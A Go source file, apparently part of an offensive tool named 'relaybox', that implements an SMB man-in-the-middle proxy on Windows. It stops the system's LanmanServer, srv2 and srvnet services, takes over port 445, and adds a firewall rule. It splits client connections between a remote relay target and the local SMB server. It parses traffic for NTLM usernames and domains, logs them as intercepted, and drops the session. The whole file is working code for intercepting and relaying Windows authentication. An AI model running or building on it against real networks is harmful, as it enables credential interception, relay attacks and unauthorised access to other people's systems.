package smb

import (
	"fmt"
	"io"
	"log"
	"net"
	"strings"
	"sync/atomic"
	"time"

	"relaybox/pkg/system/executil"
	"relaybox/pkg/system/logging"
	"relaybox/pkg/system/ntlm"
	"relaybox/pkg/system/winsvc"
)

type SMB struct {
	Listeners      []net.Listener
	ExePath        string
	LocalAddresses []string
	RemoteAddr     string
	WinAPI         bool
	Logger         *logging.Logger
}

func NewSMB(exePath string, localAddresses []string, remoteAddr string, winAPI bool, verbose bool) *SMB {
	return &SMB{
		Listeners:      []net.Listener{},
		ExePath:        exePath,
		LocalAddresses: localAddresses,
		RemoteAddr:     remoteAddr,
		WinAPI:         winAPI,
		Logger:         logging.NewLogger("SMB", verbose),
	}
}

func (s *SMB) GetPort() string {
	return ":445"
}

func (s *SMB) GetServiceName() string {
	return "SMB"
}

func (s *SMB) Start() int {
	s.disableSMB()

	for _, addr := range s.LocalAddresses {
		for i := 0; i < 3; i++ {
			time.Sleep(1 * time.Second)
			listener, err := net.Listen("tcp", addr+s.GetPort())
			if err != nil {
				s.Logger.Verbose(fmt.Sprintf("Try %d -> Failed to listen on %s: %v", i, addr, err))
				continue
			}
			s.Listeners = append(s.Listeners, listener)
			s.Logger.Log(fmt.Sprintf("Proxy listening on %s, forwarding SMB to %s", addr, s.RemoteAddr))
			break
		}
	}

	if len(s.Listeners) == 0 {
		s.Logger.Log("No listeners created, exiting...")
		return 1
	}

	s.createSMBFirewallRule()
	s.Logger.Log("Waiting 5 seconds and then re-enabling system SMB so that it listens on 127.0.0.1:445")
	time.Sleep(5 * time.Second) // Wait for the firewall rule to take effect
	s.enableSMB()

	// Accept and handle incoming connections
	for _, listener := range s.Listeners {
		go s.listenerHandler(listener)
	}

	return 0
}

func (s *SMB) Stop() {
	for _, listener := range s.Listeners {
		if err := listener.Close(); err != nil {
			s.Logger.Verbose(fmt.Sprintf("Error closing listener: %v", err))
		}
	}
	s.removeSMBFirewallRule()
	s.disableSMB()
	log.Println("Waiting 5 seconds and then re-enabling system SMB...")
	time.Sleep(5 * time.Second)
	s.enableSMB()
}

// PROXY HANDLING

func (s *SMB) listenerHandler(listener net.Listener) {
	history := make(map[string]int)
	for {
		conn, err := listener.Accept()
		if err != nil {
			s.Logger.Verbose(fmt.Sprintf("Accept error: %v", err))
			break
		}
		s.Logger.Log(fmt.Sprintf("Accepted connection from %s", conn.RemoteAddr()))
		client := strings.Split(conn.RemoteAddr().String(), ":")[0]
		if _, ok := history[client]; !ok {
			history[client] = 1
			s.Logger.Verbose(fmt.Sprintf("New client %s", client))
		} else {
			history[client]++
		}
		if history[client]%2 == 0 {
			go s.handleConnection(conn, "127.0.0.1:445", true)
			s.Logger.Verbose(fmt.Sprintf("Forwarding to local SMB server for client %s", client))
		} else {
			go s.handleConnection(conn, s.RemoteAddr+s.GetPort(), false)
		}
	}
}

func (s *SMB) handleConnection(localConn net.Conn, remoteAddr string, isLocal bool) {
	defer localConn.Close()

	// do this?: https://stackoverflow.com/questions/31554196/ssh-connection-timeout/31566330#31566330

	// Connect to the remote host
	remoteConn, err := net.Dial("tcp", remoteAddr)
	if err != nil {
		s.Logger.Verbose(fmt.Sprintf("Failed to connect to remote %s: %v", remoteAddr, err))
		return
	}
	defer remoteConn.Close()

	// When connection from client to local SMB is closed, close the remote connection
	// Start copying data in both directions
	var closed uint32
	go func() {
		total, err := s.copyWithLog(remoteConn, localConn, !isLocal, &closed)
		if err != nil {
			s.Logger.Verbose(fmt.Sprintf("Error proxying local→remote: %v", err))
		} else if total == -1 {
			s.Logger.Verbose("Dropping the connection")
			remoteConn.Close()
		}
		atomic.StoreUint32(&closed, 1)
	}()

	// log data flowing from remote → local
	if _, err := s.copyWithLog(localConn, remoteConn, false, &closed); err != nil {
		s.Logger.Verbose(fmt.Sprintf("Error proxying remote→local: %v", err))
		atomic.StoreUint32(&closed, 1)
	}
}

func (s *SMB) copyWithLog(dst io.Writer, src io.Reader, analyze bool, close *uint32) (int64, error) {
	buf := make([]byte, 32*1024)
	var total int64

	for atomic.LoadUint32(close) == 0 {
		n, err := src.Read(buf)
		if n > 0 {
			data := buf[:n]
			w, werr := dst.Write(data)
			if analyze {
				user := ntlm.ExtractUsernameAndDomain(data)
				if user != "" {
					s.Logger.Log(fmt.Sprintf("Intercepted user: %s", user))
					return -1, nil
				}
			}

			// forward the actual bytes
			if werr != nil {
				return total, werr
			}
			if w != len(data) {
				return total, io.ErrShortWrite
			}
			total += int64(w)
		}
		if err != nil {
			if err == io.EOF {

				return total, nil
			}
			return total, err
		}
	}

	return total, nil
}

// INTERNAL

func (s *SMB) disableSMB() {
	s.Logger.Log("Disabling built-in SMB...")
	if !s.WinAPI {
		executil.RunCommand("sc.exe config LanmanServer start= disabled")
		time.Sleep(500 * time.Millisecond)
		executil.RunCommand("sc.exe stop LanmanServer")
		time.Sleep(500 * time.Millisecond)
		executil.RunCommand("sc.exe stop srv2")
		time.Sleep(500 * time.Millisecond)
		executil.RunCommand("sc.exe stop srvnet")
	} else {
		winsvc.Disable("LanmanServer")
		time.Sleep(500 * time.Millisecond)
		winsvc.Stop("LanmanServer")
		time.Sleep(500 * time.Millisecond)
		winsvc.Stop("srv2")
		time.Sleep(500 * time.Millisecond)
		winsvc.Stop("srvnet")
	}
	s.Logger.Log("Built-in SMB disabled.")

}

func (s *SMB) enableSMB() {
	s.Logger.Log("Enabling built-in SMB...")
	if !s.WinAPI {
		executil.RunCommand("sc.exe config LanmanServer start= auto")
		time.Sleep(500 * time.Millisecond)
		executil.RunCommand("sc.exe start LanmanServer")
		time.Sleep(500 * time.Millisecond)
		executil.RunCommand("sc.exe start srv2")
		time.Sleep(500 * time.Millisecond)
		executil.RunCommand("sc.exe start srvnet")
	} else {
		winsvc.Enable("LanmanServer")
		time.Sleep(500 * time.Millisecond)
		winsvc.Start("LanmanServer")
		time.Sleep(500 * time.Millisecond)
		winsvc.Start("srv2")
		time.Sleep(500 * time.Millisecond)
		winsvc.Start("srvnet")
	}
	s.Logger.Log("Built-in SMB enabled.")
}

func (s *SMB) createSMBFirewallRule() {
	s.Logger.Log("Creating SMB firewall rule...")
	localAddressesStr := ""
	for _, addr := range s.LocalAddresses {
		localAddressesStr += fmt.Sprintf(`"%s",`, addr)
	}
	localAddressesStr = strings.TrimSuffix(localAddressesStr, ",")
	ruleCmd := fmt.Sprintf(
		`New-NetFirewallRule -DisplayName "SMB 445" -Direction Inbound -Action Allow -Protocol TCP -LocalPort 445 -LocalAddress @(%s) -Program "%s"`,
		localAddressesStr,
		s.ExePath,
	)
	executil.RunCommandPowershell(ruleCmd)
	s.Logger.Log("SMB firewall rule created.")
}

func (s *SMB) removeSMBFirewallRule() {
	s.Logger.Log("Removing SMB firewall rule...")
	executil.RunCommandPowershell(`Remove-NetFirewallRule -DisplayName "SMB 445"`)
	s.Logger.Log("SMB firewall rule removed.")
}
